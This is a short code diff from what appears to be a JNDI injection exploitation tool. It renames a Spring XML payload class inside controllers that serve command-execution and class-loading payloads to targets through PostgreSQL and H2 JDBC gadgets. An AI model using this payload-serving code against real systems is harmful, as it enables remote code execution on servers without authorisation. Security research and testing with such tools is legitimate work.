@@ -6,7 +6,7 @@ import javassist.CtField;
 import map.jndi.Main;
 import map.jndi.annotation.JNDIMapping;
 import map.jndi.payload.GroovyPayload;
-import map.jndi.payload.SpringXmlPayload;
+import map.jndi.payload.SpringXMLPayload;
 import map.jndi.server.WebServer;
 import map.jndi.template.Command;
 import map.jndi.template.DerbyTool;
@@ -78,7 +78,7 @@ public abstract class DatabaseController implements Controller {
         System.out.println("[PostgreSQL] Cmd: " + cmd);
 
         String fileName = MiscUtil.getRandStr(8) + ".xml";
-        String fileContent = SpringXmlPayload.command(cmd);
+        String fileContent = SpringXMLPayload.command(cmd);
         WebServer.getInstance().serveFile("/" + fileName, fileContent.getBytes());
 
         String socketFactory = "org.springframework.context.support.ClassPathXmlApplicationContext";
@@ -106,7 +106,7 @@ public abstract class DatabaseController implements Controller {
         byte[] byteCode = clazz.toBytecode();
 
         String fileName = MiscUtil.getRandStr(8) + ".xml";
-        String fileContent = SpringXmlPayload.loadClass(className, byteCode);
+        String fileContent = SpringXMLPayload.loadClass(className, byteCode);
         WebServer.getInstance().serveFile("/" + fileName, fileContent.getBytes());
 
         String socketFactory = "org.springframework.context.support.ClassPathXmlApplicationContext";
@@ -293,7 +293,7 @@ public abstract class DatabaseController implements Controller {
         System.out.println("[H2-JRE] [Spring] [Command] Cmd: " + cmd);
 
         String xmlFileName = MiscUtil.getRandStr(8) + ".xml";
-        String xmlContent = SpringXmlPayload.command(cmd);
+        String xmlContent = SpringXMLPayload.command(cmd);
         WebServer.getInstance().serveFile("/" + xmlFileName, xmlContent.getBytes());
 
         String sqlFileName = MiscUtil.getRandStr(8) + ".sql";
@@ -333,7 +333,7 @@ public abstract class DatabaseController implements Controller {
         byte[] byteCode = clazz.toBytecode();
 
         String xmlFileName = MiscUtil.getRandStr(8) + ".xml";
-        String xmlContent = SpringXmlPayload.loadClass(className, byteCode);
+        String xmlContent = SpringXMLPayload.loadClass(className, byteCode);
         WebServer.getInstance().serveFile("/" + xmlFileName, xmlContent.getBytes());
 
         String sqlFileName = MiscUtil.getRandStr(8) + ".sql";
